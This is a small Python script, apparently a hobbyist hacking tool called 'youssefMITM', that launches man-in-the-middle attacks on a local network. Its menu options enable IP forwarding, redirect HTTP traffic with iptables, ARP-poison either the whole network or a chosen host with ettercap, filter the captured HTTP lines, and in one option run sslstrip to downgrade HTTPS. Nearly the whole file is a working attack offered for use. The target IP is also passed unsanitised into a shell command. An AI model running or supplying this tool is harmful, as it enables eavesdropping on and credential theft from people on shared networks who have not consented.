import os
os.system("clear")
print(""" \033[36m
                                 
                                 __ __  __ ___ _____ __  __ 
 _   _  ___  _   _ ___ ___  ___ / _|  \/  |_ _|_   _|  \/  |
| | | |/ _ \| | | / __/ __|/ _ \ |_| |\/| || |  | | | |\/| |
| |_| | (_) | |_| \__ \__ \  __/  _| |  | || |  | | | |  | |
 \__, |\___/ \__,_|___/___/\___|_| |_|  |_|___| |_| |_|  |_|
 |___/                                   

""")
print("\033[37m By youssef \n")
print("\033[37m github:https://github.com/youhacker55/ \n")
print("\033[37m facebook:youssefslimene \n")
def options():
    print ("(1) - Mitm all Network")
    print ("(2) - Mitm set target")
    print ("(0) - Close")
    option =(int(input("Set option: ")))
    if option == 1:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 4003")
        os.system("ettercap -TqM ARP:REMOTE //// | grep 'HTTP : ' ")
        os.system("sslstrip -a -l 4003" )

    elif option == 2:
        host = input("Set IP HOST: ")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 4003")
        os.system("ettercap -TqM ARP:REMOTE //"+host+"/ | grep 'HTTP : ' ")

    elif option == 0:
        print("Thank you to try my script.Goodbye")
        quit()

    else:
        print("option not found ")
        options()
options()
